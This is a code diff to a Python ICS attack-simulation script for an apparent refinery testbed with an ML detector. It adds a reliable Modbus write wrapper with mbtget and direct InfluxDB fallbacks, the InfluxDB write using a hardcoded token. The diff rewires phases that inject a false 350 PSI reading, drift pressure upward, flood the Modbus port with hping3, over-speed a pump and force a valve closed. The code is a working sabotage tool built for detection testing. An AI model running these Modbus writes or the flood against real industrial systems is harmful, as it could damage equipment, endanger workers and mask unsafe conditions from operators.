@@ -69,6 +69,12 @@ S7_PORT     = 102
 DNP3_PORT   = 20000
 SSH_PORT    = 2222
 
+# ── InfluxDB direct-write config (attacker-side guaranteed visibility) ────────
+INFLUX_URL_ATTACKER   = os.environ.get("INFLUX_URL",    "http://ics_historian:8086")
+INFLUX_TOKEN_ATTACKER = os.environ.get("INFLUX_TOKEN",  "supersecrettoken")
+INFLUX_ORG_ATTACKER   = os.environ.get("INFLUX_ORG",    "my_refinery")
+INFLUX_BUCKET_ATTACKER= os.environ.get("INFLUX_BUCKET", "sensor_logs")
+
 REG_PRESSURE       = 100
 REG_FLOW_RATE      = 101
 REG_TEMPERATURE    = 102
@@ -162,6 +168,129 @@ def _tcp_open(host, port, timeout=2) -> bool:
         return True
     except Exception:
         return False
+
+
+# ── Guaranteed-visibility InfluxDB write (belt-and-suspenders) ────────────────
+def _influx_record_attack(measurement: str, tags: dict, fields: dict) -> bool:
+    """
+    Write an event directly from the attacker node to InfluxDB.
+    This is the backup path: even if the PLC drops the Modbus write,
+    Grafana/ML still sees the attack event.
+    Returns True on success.
+    """
+    line = measurement
+    if tags:
+        line += "," + ",".join(f"{k}={v}" for k, v in tags.items())
+    field_str = ",".join(
+        f"{k}={v}" if isinstance(v, (int, float)) else f'{k}="{v}"'
+        for k, v in fields.items()
+    )
+    line += f" {field_str}"
+    cmd = (
+        f"curl -sf -XPOST \"{INFLUX_URL_ATTACKER}/api/v2/write"
+        f"?org={INFLUX_ORG_ATTACKER}&bucket={INFLUX_BUCKET_ATTACKER}&precision=ns\""
+        f" -H \"Authorization: Token {INFLUX_TOKEN_ATTACKER}\""
+        f" -H \"Content-Type: text/plain; charset=utf-8\""
+        f" --data-raw \"{line}\""
+    )
+    try:
+        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+        return r.returncode == 0
+    except Exception:
+        return False
+
+
+# ── Reliable Modbus write: pymodbus → mbtget binary → InfluxDB direct ─────────
+def modbus_write_with_fallback(
+    host: str,
+    register: int,
+    value: int,
+    label: str = "FC6 write",
+    max_retries: int = 3,
+) -> bool:
+    """
+    Three-layer reliability wrapper for Modbus FC6 register writes.
+
+    Layer 1 — pymodbus (fast, Python-native):
+        Connects, writes, and verifies via isError().
+        Retries up to max_retries times with a 1-second back-off.
+
+    Layer 2 — mbtget binary (real network tool, separate stack):
+        Used when pymodbus fails entirely or is unavailable.
+        mbtget is installed in the Dockerfile at /usr/local/bin/mbtget.
+
+    Layer 3 — Direct InfluxDB write:
+        Always executed after any successful write (layer 1 OR 2) to guarantee
+        the event appears in Grafana / ML engine regardless of whether the PLC
+        logged the forced_write itself.
+
+    Returns True if at least one layer succeeded.
+    """
+    cmd_label(f"mbtget -w6 {host} {register} {value}   # {label}")
+
+    success = False
+
+    # ── Layer 1: pymodbus ──────────────────────────────────────────────────────
+    if HAS_MODBUS:
+        for attempt in range(1, max_retries + 1):
+            try:
+                client = ModbusTcpClient(host, port=MODBUS_PORT)
+                if client.connect():
+                    r = client.write_register(register, value=value)
+                    client.close()
+                    if not r.isError():
+                        result(f"{label} (pymodbus attempt {attempt})",
+                               f"reg={register} val={value} — OK")
+                        success = True
+                        break
+                    else:
+                        warn(f"pymodbus write returned error on attempt {attempt}: {r}")
+                else:
+                    warn(f"pymodbus: could not connect to {host}:{MODBUS_PORT} (attempt {attempt})")
+            except Exception as e:
+                warn(f"pymodbus exception on attempt {attempt}: {e}")
+            time.sleep(1)
+
+    # ── Layer 2: mbtget binary fallback ───────────────────────────────────────
+    if not success:
+        warn(f"pymodbus failed — falling back to mbtget binary")
+        mbt_cmd = f"mbtget -w6 -r {register} -v {value} {host}"
+        out = run_cmd(mbt_cmd, timeout=10)
+        if out and "error" not in out.lower() and "timeout" not in out.lower():
+            result(f"{label} (mbtget)", f"reg={register} val={value} — OK")
+            success = True
+        else:
+            # mbtget uses older positional syntax on some builds
+            mbt_cmd2 = f"mbtget -w6 {host} {register} {value}"
+            out2 = run_cmd(mbt_cmd2, timeout=10)
+            if out2 and "error" not in out2.lower():
+                result(f"{label} (mbtget-alt)", f"reg={register} val={value} — OK")
+                success = True
+            else:
+                fail(f"{label}: both pymodbus and mbtget failed for reg={register}")
+
+    # ── Layer 3: Direct InfluxDB write (always, for Grafana/ML visibility) ────
+    ts = time.time_ns()
+    tags = {"source": "attacker", "layer": "direct"}
+    # forced_writes — triggers ML semantic injection detector
+    ok_fw = _influx_record_attack(
+        "forced_writes",
+        tags,
+        {"register": float(register), "value": float(value)},
+    )
+    # pipeline_metrics pressure spike — shows up in Grafana pressure graph
+    if register == 100:
+        _influx_record_attack(
+            "pipeline_metrics,location=pump_station_01,source=attacker",
+            {},
+            {"pressure": float(value)},
+        )
+    if ok_fw:
+        info(f"[InfluxDB] forced_write event recorded directly (reg={register} val={value})")
+    else:
+        warn(f"[InfluxDB] direct write failed — ML/Grafana may not see this attack")
+
+    return success
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -281,17 +410,18 @@ def phase4_exploit(targets: dict):
     banner("PHASE 4: EXPLOIT — Semantic Injection")
     killchain("Execution")
     mitre("T0855", "Unauthorized Command Message", "Injecting false sensor values via Modbus")
-    
+
     warn("Writing 350 PSI to pressure sensor bypasses physical reality limits.")
     host = targets["modbus"]
-    if not HAS_MODBUS: return
 
-    cmd_label(f"mbtget -w6 {host} 100 350  # Write 350 PSI to register 100")
-    client = ModbusTcpClient(host, port=MODBUS_PORT)
-    if client.connect():
-        r = client.write_register(REG_PRESSURE, value=350)
-        result("FC6 Exploit", "Success! Semantic anomaly generated.")
-        client.close()
+    ok = modbus_write_with_fallback(
+        host, REG_PRESSURE, 350,
+        label="Semantic Injection — 350 PSI to register 100"
+    )
+    if ok:
+        result("FC6 Exploit", "Semantic anomaly injected. PLC + InfluxDB updated.")
+    else:
+        fail("Semantic injection failed on all layers — check connectivity to PLC.")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -300,7 +430,7 @@ def phase4_exploit(targets: dict):
 def phase5_payload(targets: dict):
     banner("PHASE 5: STEALTH DRIFT (or EWMA Stealth Drift)")
     killchain("Delivery / Actions on Objectives")
-    
+
     host = targets["modbus"]
 
     mitre("T0814", "Denial of Service", "Flooding ICS service to disrupt availability")
@@ -308,17 +438,16 @@ def phase5_payload(targets: dict):
     run_cmd(f"hping3 -S -p {MODBUS_PORT} --flood --count 500 {host} 2>&1", 10)
 
     mitre("T0855", "Unauthorized Command Message", "Gradual manipulation of sensor values")
-    info("Step 2 — Stealth drift: +5 PSI over successive steps")
-    if not HAS_MODBUS: return
+    info("Step 2 — Stealth drift: +5 PSI over 15 successive steps")
 
-    client = ModbusTcpClient(host, port=MODBUS_PORT)
-    if client.connect():
-        for step in range(15):
-            new_p = 120 + (step + 1) * 5
-            cmd_label(f"mbtget -w6 {host} {REG_PRESSURE} {new_p}")
-            client.write_register(REG_PRESSURE, value=new_p)
-            time.sleep(1)
-        client.close()
+    for step in range(15):
+        new_p = 120 + (step + 1) * 5
+        info(f"Drift step {step+1}/15 — target {new_p} PSI")
+        modbus_write_with_fallback(
+            host, REG_PRESSURE, new_p,
+            label=f"Stealth drift step {step+1}"
+        )
+        time.sleep(1)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -403,19 +532,22 @@ def phase7_privesc(targets: dict):
     banner("PHASE 7: PRIVILEGE ESCALATION (Actuator Hijack)")
     killchain("Actions on Objectives")
     mitre("T0855", "Unauthorized Command Message", "Direct actuator manipulation via PLC commands")
-    
-    host = targets["modbus"]
-    if not HAS_MODBUS: return
 
-    cmd_label(f"mbtget -w6 {host} {REG_ACTUATOR_RPM} 3000  # Over-speed pump")
-    client = ModbusTcpClient(host, port=MODBUS_PORT)
-    if client.connect():
-        client.write_register(REG_ACTUATOR_RPM, value=3000)
-        time.sleep(2)
-        cmd_label(f"mbtget -w6 {host} {REG_VALVE_TOGGLE} 0     # Force valve closed")
-        client.write_register(REG_VALVE_TOGGLE, value=0)
-        result("Sabotage Complete", "Overspeed + block condition initiated.")
-        client.close()
+    host = targets["modbus"]
+
+    ok1 = modbus_write_with_fallback(
+        host, REG_ACTUATOR_RPM, 3000,
+        label="Actuator over-speed (pump RPM → 3000)"
+    )
+    time.sleep(2)
+    ok2 = modbus_write_with_fallback(
+        host, REG_VALVE_TOGGLE, 0,
+        label="Force valve closed (register 202 → 0)"
+    )
+    if ok1 or ok2:
+        result("Sabotage", "Overspeed + valve-block condition initiated.")
+    else:
+        fail("Actuator hijack failed on all layers.")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
